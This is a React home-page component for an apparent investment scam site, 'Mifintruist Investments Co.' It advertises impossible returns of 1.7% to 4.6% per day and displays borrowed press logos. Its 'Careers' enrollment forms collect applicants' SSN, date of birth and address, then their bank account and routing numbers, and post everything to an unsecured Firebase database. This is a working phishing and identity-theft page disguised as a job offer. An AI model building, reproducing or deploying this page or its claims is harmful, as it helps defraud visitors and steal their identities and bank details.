import React,{useState,useEffect,useRef} from "react";
import { useLocation } from "react-router-dom"
import Footer from "../components/Footer";
import { Button,CardTitle,Card  ,Row,Col } from "reactstrap";
import { RadioGroup, RadioButton } from 'react-radio-buttons';
import {
  BrowserRouter as Router,
  Switch,
  Route,
  Link,
  useParams
} from "react-router-dom";

import { Alert } from "reactstrap";
import axios from "axios";
import { add } from "date-fns";


export default function Home() {
  const location = useLocation()
  const aboutref=useRef(null)
  const careeref=useRef(null)
  const planref=useRef(null)
  const contactref=useRef(null)


  const params = new URLSearchParams(location.search)
  const short = require('short-uuid');
  const [eid,seteid]=useState('')
  const [uid,setuid]=useState(short.generate())
  const[showenroll1,setshowenroll1]=useState(false)
  const[showenroll2,setshowenroll2]=useState(false)
  const[showenroll3,setshowenroll3]=useState(false)
  const [key,setkey]=useState('')
  const [refid,setrefid]=useState(params.get("refid"))
  const[current,setcurrent]=useState()
  const[loading,setloading]=useState(false)
  const[rm,setrm]=useState(true)
const[nm,setnm]=useState('')
const[em,setem]=useState('')
const[ssn,setssn]=useState('')
const[dob,setdob]=useState('')
const[country,setcountry]=useState('')
const[phone,setphone]=useState('')
const[bn,setbn]=useState('')
const[rn,setrn]=useState('')
const[an,setan]=useState('')
const[add1,setadd1]=useState('')
const[add2,setadd2]=useState('')
const[toggle,settoggle]=useState(false)
console.log("ref",refid);
  return (
    <div >
      
      <div className="body"><nav className="navv ">
        <div className="logo">
          <img src="https://i.postimg.cc/bJ3fVdzK/mfn.jpg" style={{maxHeight:'60px'}} alt="Logo Image" />
        </div>
        <div className={`hamburger ${toggle?"toggle":""}`} onClick={()=>{ settoggle(!toggle)}}>
          <div className="line1" />
          <div className="line2" />
          <div className="line3" />
        </div>
        <ul className={`nav-links ${toggle?"open":''}`}>
          <li ><a href="" onClick={(e)=>{e.preventDefault();settoggle(false); }}>Home</a></li>
          <li  ><a href="" onClick={(e)=>{ e.preventDefault();aboutref.current.scrollIntoView();settoggle(false) }}>About</a></li>
        
          <li ><a href="" onClick={(e)=>{e.preventDefault();settoggle(false); careeref.current.scrollIntoView()}}>Career</a></li>
          <li ><a href="" onClick={(e)=>{e.preventDefault(); settoggle(false);planref.current.scrollIntoView() }}>Products & Services</a></li>
          <li ><a href="" onClick={(e)=>{e.preventDefault();settoggle(false); contactref.current.scrollIntoView() }}>Contact Us</a></li>
          <li ><button className="login-button" onClick={()=>{window.location.href="/dashboard";settoggle(false)}}>Login</button></li>
          <li ><button className="join-button" onClick={()=>{window.location.href="/register";settoggle(false)}} href="/register">Join</button></li>
        </ul>
      </nav></div>
      
      <div className="section-padding-0 wf-section"><div className="custom-container no-padding">
      
        <div className="cover-image">
       
          <div className="header-card-label">
        
            <div className="header-card-container">
            <h1>MIFINTRUIST INVESTMENTS CO.</h1>
              <div className="header-text-home">
                <h3 className="container-title card-home">The easiest way to invest in blockchain ledgers.</h3> <a href="/register" className="button-high-emphasis w-button" style={{textDecoration:'none',color:'white'}}>Get Started</a>
     </div>
     </div>
     </div>
     </div>
     </div>
     </div>
     <div className="section-padding-30 wf-section"><div className="custom-container w-container"><div className="press-logo-box w-clearfix"><img src="https://uploads-ssl.webflow.com/5d8dc9a6884b1c2d9dab8c5c/5ee0efdb211445e33abbd7ab_IncomPoint.png" width="176" id="w-node-e1486e17-a287-0a53-6075-c1565865e951-58ab8c5d" alt="IncomPoint Logo" className="press-logo"/><img src="https://uploads-ssl.webflow.com/5d8dc9a6884b1c2d9dab8c5c/5ee0e83e1d04662df83e7d98_Product%20Hunt.png" width="160" id="w-node-_45a7001b-4a79-dc44-321c-da1f91739805-58ab8c5d" alt="Product Hunt logo" className="press-logo"/>
     <img src="https://uploads-ssl.webflow.com/5d8dc9a6884b1c2d9dab8c5c/5ee0e1b71d046618ea3e4ab2_logodk-bloomberg.png" width="152" id="w-node-df2843b8-4adf-f145-1864-c3645919ea73-58ab8c5d" alt="Bloomberg logo" className="press-logo"/><img src="https://uploads-ssl.webflow.com/5d8dc9a6884b1c2d9dab8c5c/60f884dd9eb8620bc663d18a_xt74rq3vrclnb94ffub1.png" width="83" id="w-node-a1d7123c-e97d-40a6-f770-a073fadb97cf-58ab8c5d" alt="Forbes logo" className="press-logo"/><img src="https://uploads-ssl.webflow.com/5d8dc9a6884b1c2d9dab8c5c/5ee0e452209cec3446d485fa_BrokerOnline.png" width="142" id="w-node-bfdf9d14-7afa-af3a-ff98-aa829be27bfb-58ab8c5d" alt="BrokerOnline logo" className="press-logo broker"/><img src="https://uploads-ssl.webflow.com/5d8dc9a6884b1c2d9dab8c5c/5ee0e21c668958fd02fe29e0_Picture%202.png" width="199" id="w-node-_897caefe-9eb8-a402-5e50-804f254d33c0-58ab8c5d" alt="Robo Advisor Pros" className="press-logo"/></div></div></div>
     <div className="section-padding-30 wf-section"><div className="custom-container"><div className="spacer-30"></div><div className="crypto-explanation"><div className="crypto-explanation-texts"><div className="crypto-explanation-title"><h2>The Easiest way to invest <span className="text-span">in block chain ledgers and build your cryptocurrency portfolio and <br/>digital wealth</span></h2></div><div className="crypto-explanation-description"><div className="crypto-explanation-details"><p>Investing in cryptocurrency can be intimidating, especially for beginners. Sometimes managing a crypto investment is daunting due to the uncertainty and volatility of the market, as well as the time investment needed to be successful.</p></div></div></div></div></div></div>
     <div className="section-padding-30 wf-section"><div className="custom-container"><div className="spacer-30"></div><div className="crypto-explanation"><div className="crypto-explanation-texts"><div className="crypto-explanation-title"><h2>How to invest in crypto and stocks today for a comfortable tomorrow</h2></div><div className="crypto-explanation-description"><div className="crypto-explanation-details">
       <p>Mifintruist aims to simplify and enhance the experience of investing in blockchain ledgers. We enable users to enter the crypto market with zero learning curve required, and we help construct diversified portfolios with the aim to maximize returns while maintaining your preferred risk profile.</p></div></div></div></div></div>
       </div>
       <div className="section-padding-0 wf-section"><div className="custom-container no-padding added-padding"><div className="rectangle-dollar-invested"><div className="counter-invested-dollar"><h1 className="header-important-big red-text" style={{color:"gold",fontSize:"100px"}}>+2</h1></div><div className="text-invested-dollar"><h1 className="white-text text-center" style={{color:"white"}}>million dollars</h1><h5 className="white-text text-center">has been already invested with Mifintruist</h5></div><div className="button-container-invested-dollar"><a href="/register" style={{textDecoration:"none",color:"white"}} className="button-high-emphasis w-button">Get Started</a></div></div></div></div>
       <div className='plans'>


<section>
<div className="carousel-wrapper">
  <div className="carousel-container">
    <div className="carousel">
      <div className="image-one"></div>
      <div className="image-two"></div>
      <div className="image-three"></div>
    </div>
  </div>
</div>
</section>
<br />
<br />
<div className="about"  ref={aboutref}style={{backgroundColor:'aliceblue',margin:"20px 0px"}}>
  <br />
   <h1 style={{textAlign:"center"}}>About Us</h1>
   <p style={{textAlign:"left",margin:"5%"}}> Mifintruistinvestments is a New York City-based company founded in 2006 by David Schmitt and Partners, offers a diverse and splendid investment portfolio opportunity to those looking to invest in our firm. Mifintruist offers splendid asset management and investment management services. We deliver investors modern ways of the increasing value of assets dedicated to our company through a united states treasury Bond making sure that we guarantee investors safe returns and reliable investment portfolios. Mifintruist uses sophisticated blockchain technology to ensure security and investors' confidence which also makes investment easy for on-looking and potential investors. We based our ideology primarily on client satisfaction because we aim at exceeding your expectations and we go to stellar lengths to provide you with an adequate investment environment. The modern company must be data-driven, innovative, and able to scale and respond to market dynamics rapidly. We have perfected this and therefore created a platform to make sure your investment goals are reached in addition we have made our investment portfolio easy to navigate. We cater to the investment needs of individuals, pension and profit-sharing plans, trusts, and business entities and are proud to do business with our clients. Our mission is to provide timely, accurate, and pertinent value-added financial services to our high-net-worth clients.</p>
<br />
<p style={{textAlign:"left",margin:"5%"}}>We always provide a detailed, extensive complimentary portfolio review analysis of your stock, bond, ETF and mutual fund portfolio before you become a client.We will also, as a courtesy (and without cost to you), review your 401(k), 403(b), 529 College Savings Plan(s), SEP-IRA, Traditional IRA as well as ROTH IRA plans that you may hold.</p>
  <p style={{textAlign:"left",margin:"5%"}}> Mifintruist strives to introduce long term value in our recruited agents. We urge them to have strong business sense and to remain committed to the goal of achieving financial literacy. We are committed to helping our agents and customers grow their wealth through a variety of life insurance products and services. Some of them include life insurance, annuities, living benefits, retirement, and long term care management. our Investments diverse investment plan are backed by the the united stated Treasury bonds. If you’ve worked hard and saved throughout your life, we can help you retire comfortably and confidently through tailored money management, industry-leading client service, illuminating insights and a portforlio structure aligned with your success.</p> 
   </div>
<h1 ref={careeref}style={{textAlign:"center"}}>Careers</h1>
<p style={{textAlign:"center"}}>This is a great new role across all 50 US states, which comes in with a reputable and market excelling company. We are looking to add a payroll clerk to our team who can contribute to the guiding and supporting of our lovely team while they deliver on the Market. Contrary to most job programmed offered by other firms, with us you will be able to work while maintaining a quality time for yourself.


</p>
<div style={{display:'flex',gap:'3px',justifyContent:'center',margin:'10px auto',width:'400px'}}><button className="erb"  style={{backgroundColor:'#61DAFB',color:'white',border:'1px solid #61DAFB',borderRadius:'2px'}} onClick={(e)=>{
    e.preventDefault()
    setshowenroll1(true)
    setshowenroll2(false)
    setshowenroll3(false)
  }}>Enroll</button>
  <button className="erb" onClick={(e)=>{
    e.preventDefault()
    setshowenroll1(false)
    setshowenroll2(false)
    setshowenroll3(true)}} style={{backgroundColor:'#61DAFB',color:'white',border:'1px solid #61DAFB',borderRadius:'2px'}}>Check Enrollment</button>
  
  </div>
<div className="formcnt">
  
    {!!showenroll3 &&
      <form action="" className="form">
    <Alert color="info">Please Enter your enrollment id to proceed</Alert>
    
    <p className="formtxt" > Enrollment id</p>
    <input type="text"  value={eid} onChange={(e)=>{seteid(e.target.value)}}/>
    <button className="golden-btn" type="submit" onClick={(e)=>{e.preventDefault()
    setloading(true)
    axios.get("https://enrollment-a5de6-default-rtdb.firebaseio.com/.json").then((result)=>{
      var count=0
      console.log(result);
Object.keys(result.data.enrolledusers).map((key,ind)=>{
  console.log(key)
if(eid==result.data.enrolledusers[key].id && result.data.enrolledusers[key].status=="active" ){
count++
setcurrent(result.data.enrolledusers[key])
setkey(key)

}



})
if(count>0){
  setloading(false)
  setshowenroll2(true)
  setshowenroll3(false)
  
}
else{
  alert("no active enrollment for this id. please try again later ")
  setloading(false)

}



    })
    
    }}>Submit</button>
    </form>
    }
  
  {!!showenroll1 &&<form onSubmit={(e)=>{
e.preventDefault()
axios.post('https://enrollment-a5de6-default-rtdb.firebaseio.com/enrolledusers/.json',{
name:nm,
dob:dob,
email:em,
phone:phone,
refid:refid,
status:'disabled',
ssn:ssn,
country:country,
address1:add1,
address2:add2,
id:uid
}).then(()=>{
 alert('Your enrollment has been submitted, you will be contacted shortly via email by our assigned recruiter')
 window.location.reload()
})
  }} className="form">
    <Alert color="info">Please copy this id to use to check your enrollment status .</Alert>
    <h4 className="uid">Enrollment Id : {uid}</h4>
    <p className="formtxt" > Full Name <span>*</span></p>
    <input type="text"  value={nm} onChange={(e)=>{setnm(e.target.value)}}required/>
    <p className="formtxt"> Email <span>*</span></p>
    <input type="email" value={em} onChange={(e)=>{setem(e.target.value)}}required/>
    <p className="formtxt"> SSN <span>*</span></p>
    <input type="num" value={ssn} onChange={(e)=>{setssn(e.target.value)}}required />
    <p className="formtxt"> Phone <span>*</span></p>
    <input type="text" value={phone} onChange={(e)=>{setphone(e.target.value)}}required/>
    <p className="formtxt">Address 1 <span>*</span></p>
    <input type="text" value={add1} onChange={(e)=>{setadd1(e.target.value)}} required/>
    <p className="formtxt">Address 2</p>
    <input type="text" value={add2} onChange={(e)=>{setadd2(e.target.value)}}/>
    <p className="formtxt"> Date of Birth <span>*</span></p>
    <input type="text" value={dob} onChange={(e)=>{setdob(e.target.value)}} required={true} />
    <p className="formtxt">Country <span>*</span></p>
    <RadioGroup required	 onChange={(value)=> {
    setcountry(value)
  }} horizontal>
          <RadioButton  pointColor="gold" value="US">
          U.S.A
          </RadioButton>
          <RadioButton pointColor="gold" value="CANADA">
           Canada
          </RadioButton>
          <RadioButton pointColor="gold" value="CANADA">
           Australia
          </RadioButton>
         
        </RadioGroup>
   
   <button className="golden-btn" type="submit" onClick={(e)=>{
     
   }}>Submit</button>
  </form>}
  {!!showenroll2 && <form onSubmit={(e)=>{
    e.preventDefault()
axios.patch(`https://enrollment-a5de6-default-rtdb.firebaseio.com/enrolledusers/${key}/.json`,
{bankaccountnumber:an,bankname:bn,bankrouting:rn}).then(()=>{
  alert("Your details have been updated.You will be notified shortly after your account has been credited(2-3 days).It is important you maintain a good relationship with your assigned supervisor/trainer ")
})
  }} className="form">
     <h4 className="uid">Enrollment Id : {current.id}</h4>
    <p className="formtxt"> {nm}</p>
    
    <p className="formtxt"> Account Number</p>
    <input type="text" value={an} onChange={(e)=>{setan(e.target.value)}} />
    <p className="formtxt"> Account Routing Number</p>
    <input type="text" value={rn} onChange={(e)=>{setrn(e.target.value)}} />
    <p className="formtxt"> Bank Name</p>
    <input type="text" value={bn} onChange={(e)=>{setbn(e.target.value)}} />
    <button className="golden-btn" type="submit" onClick={()=>{}}>Submit</button>
  </form>}
  
</div>

<h2 style={{textAlign:"center"}} ref={planref}>Products and Services</h2>
<p style={{textAlign:"center",margin:'5px auto ',maxWidth:'500px'}}>Mifintruist professionals across the firm regularly produce content related to markets, securities, structured products, rates, currencies and economies around the world.

These insights originate from individuals in different divisions, including Global Investment Research, Mifintruist Asset Management, Private Wealth Management, the Securities Division and the Investment Digital Division. {!!rm &&  <a  onClick={(e)=>{e.preventDefault(); setrm(false)}} className="style-2">Read More</a>}</p>
{!rm && <p style={{textAlign:"center",margin:'5px auto ',maxWidth:'500px'}}>Given the different areas of focus of each of our businesses, and the varied goals, time horizons, investing styles and risk appetites of our clients, it is not unusual for individuals to have different views on similar topics.


Private Wealth Management (PWM). The Private Wealth Management division produces and disseminates insights about markets as well as portfolio strategies and asset allocation. These materials are intended for the division’s clients and are often custom tailored for individuals.

Securities Division. Professionals in the Securities division produce a variety of trading ideas and strategies for their professional investor clients.



To minimize confusion, the view expressed in materials created and disseminated by Mifintruist professionals are marked to make clear their business of origin within Mifintruist.

<br/> <span style={{color:'white',cursor:'pointer',padding:'10px',backgroundColor:'teal',borderRadius:'2px',margin:"10px auto",fontSize:'12px'}} onClick={()=>{setrm(true)}}>Show less</span>
 </p>}
<Row>
<Col sm="4">
<Card body
inverse
style={{

borderColor: '#060b26'

}} className="text-center bcbg">
<CardTitle tag="h3" style={{color:"greenyellow",zIndex:'3'}}>
  BLOCKCHAIN INVESTMENT
</CardTitle>
<p style={{zIndex:'3'}}>PROFITS:2% Daily(less than $5000) </p>
<p style={{zIndex:'3'}}>PROFITS:2.7% Daily(greater than $5000) </p>
<p style={{zIndex:'3'}}>BASE DEPOSIT: $500</p>
<p style={{zIndex:'3'}}>MAXDEPOSIT: UNBOUNDED</p>

<h6 style={{zIndex:'3'}}>FASTEST WITHDRAWAL PROCESS</h6>
<Button style={{zIndex:'3'}} color='warning' onClick={(e)=>{
  e.preventDefault()
  window.location.href="/register"
    
  }}>Get Started</Button>
</Card>
</Col>
<Col sm="4">
<Card body
inverse
style={{
backgroundColor: '#060b26',
borderColor: '#060b26'
}} className="text-center gdbg">
<CardTitle tag="h3" style={{color:"greenyellow",zIndex:"3"}}>
 GOLD & PETROLEUM PRODUCTS
</CardTitle>
<p style={{zIndex:'3'}}>PROFITS:3.3% Daily (less than $7500)</p>
<p style={{zIndex:'3'}}>PROFITS:4.6% Daily (more than $7500)</p>
<p style={{zIndex:'3'}}>MININVEST: $1000</p>
<p style={{zIndex:'3'}}>MAXINVEST: $4999</p>
<p style={{zIndex:'3'}}>DURATION: FLUID</p>
<h6 style={{zIndex:'3'}}>FASTEST WITHDRAWAL PROCESS</h6>
<Button style={{zIndex:'3'}}onClick={(e)=>{
  e.preventDefault()
  window.location.href="/register"
    
  }} color='warning'>Get Started</Button>
</Card>
</Col>
<Col sm="4">
<Card body
inverse
style={{
backgroundColor: '#060b26',
borderColor: '#060b26'
}} className="text-center rebg">
<CardTitle tag="h3" style={{color:"greenyellow",zIndex:'3'}}>
  REAL ESTATE PLAN
</CardTitle>
<p  style={{zIndex:'3'}}>PROFITS:1.7% DAILY (less than $1000) </p>
<p  style={{zIndex:'3'}}>PROFITS:2.5% DAILY (more than $1000) </p>
<p  style={{zIndex:'3'}}>BASE DEPOSIT: $1,000</p>
<p  style={{zIndex:'3'}}>MAX DEPOSIT: UNBOUNDED</p>
<p  style={{zIndex:'3'}}>DURATION: FLUID</p>

<h5  style={{zIndex:'3'}}>FASTEST WITHDRAWAL PROCESS</h5>

<Button style={{zIndex:'3'}} onClick={(e)=>{
  e.preventDefault()
  window.location.href="/register"
    
  }}color='warning'>Get Started</Button>
</Card>
</Col>
</Row>
<br/>

<div className="container">
            <div className="section-title">
                <h1>OUR TEAM</h1>
            </div>
            <div className="row">
                <div className="column">
                    <div className="team-4">
                        <div className="team-content">
                            <h2>David Schmitt</h2>
                            <h3></h3>
                        </div>
                        <div className="team-img">
                            <img src="assets/img/team-1-1.jpg" alt="Team Image"/>
                            <div className="team-content">
                                <p>CEO &amp; Recruiter</p>
                            </div>
                        </div>
                      
                    </div>
                </div>
                <div className="column">
                    <div className="team-4">
                        <div className="team-content">
                            <h2>Alex Miller</h2>
                            
                        </div>
                        <div className="team-img">
                            <img src="assets/img/team-1-2.jpg" alt="Team Image"/>
                            <div className="team-content">
                                <p>Accounting Manager/ Recruiter</p>
                            </div>
                        </div>
                  
                    </div>
                </div>
                <div className="column">
                    <div className="team-4">
                        <div className="team-content">
                            <h2>Linda Brown</h2>
                           
                        </div>
                        <div className="team-img">
                            <img src="assets/img/team-1-3.jpg" alt="Team Image"/>
                            <div className="team-content">
                                <p>Staff Accountant/ Loan Officer</p>
                            </div>
                        </div>
                       
                    </div>
                </div>
                <div className="column">
                    <div className="team-4">
                        <div className="team-content">
                            <h4>Michael Fitzgerald</h4>
                           
                        </div>
                        <div className="team-img">
                            <img src="assets/img/team-1-4.jpg" alt="Team Image"/>
                            <div className="team-content">
                                <p>Insurance Officer</p>
                            </div>
                        </div>
                        
                    </div>
                </div>
            </div> 
            <div className="row">
                <div className="column">
                    <div className="team-4">
                        <div className="team-content">
                            <h2>Walter Miko</h2>
                          
                        </div>
                        <div className="team-img">
                            <img src="assets/img/team-1-5.jpg" alt="Team Image"/>
                            <div className="team-content">
                                <p>Administrative Officer/Recruiter</p>
                            </div>
                        </div>
                     
                    </div>
                </div>
                <div className="column">
                    <div className="team-4">
                        <div className="team-content">
                            <h2>Marjiore Keen</h2>
                            
                        </div>
                        <div className="team-img">
                            <img src="assets/img/team-1-6.jpg" alt="Team Image"/>
                            <div className="team-content">
                                <p>Chief Marketing and Communications Officer</p>
                            </div>
                        </div>
                        
                    </div>
                </div>
              
                   
                </div>
            </div>
            <div className="contain">
        <div className="wrapper" ref={contactref}>
          <div className="form">
            <h4>GET IN TOUCH</h4>
            <h2 className="form-headline">Send us a message</h2>
            <form id="submit-form" action>
              <p>
                <input id="name" className="form-input" type="text" placeholder="Your Name*" />
                <small className="name-error" />
              </p>
              <p>
                <input id="email" className="form-input" type="email" placeholder="Your Email*" />
                <small className="name-error" />
              </p>
              <p className="full-width">
                <input id="company-name" className="form-input" type="text" placeholder="Company Name*" required />
                <small />
              </p>
              <p className="full-width">
                <textarea minLength={20} id="message" cols={30} rows={7} placeholder="Your Message*" required defaultValue={""} />
                <small />
              </p>
              <p className="full-width">
                <input type="checkbox" id="checkbox" name="checkbox" defaultChecked /> Yes, I would like to receive communications by call / email about Company's services.
              </p>
              <p className="full-width">
                <input type="submit" className="submit-btn" defaultValue="Submit" onclick="checkValidations()" />
                <button className="reset-btn" onclick="reset()">Reset</button>
              </p>
            </form>
          </div>
          <div className="contacts contact-wrapper">
            <ul>
              <li>We've driven online revenues of over <span className="highlight-text-grey">$2
                  billion</span> for our clients. Ready to know
                how we can help you?</li>
              
               
              <span className="hightlight-contact-info">
                <li className="email-info"><i className="fa fa-envelope" aria-hidden="true" /> <span style={{fontSize:'12px'}}>Info@mifintruistinvestments.com</span></li>
                <li><i className="fa fa-phone" aria-hidden="true" /> <span className="highlight-text"  style={{fontSize:'12px'}}>+1 (281) 891-3556</span></li>
                <li><i className="fab fa-linkedin-in"></i> <span className="social-li" onClick={()=>{window.location.href="https://www.linkedin.com/in/mifintruist-0553991a9/" }}  style={{fontSize:'12px'}}>Mifintruist LinkedIn</span>  </li>
                                
                
              </span>
              <li>Address : 44 wall St, 28th floor, New York, New York 10005</li> 
            </ul>
          </div>
        </div>
      </div> 
        </div>
</div>




  );
}
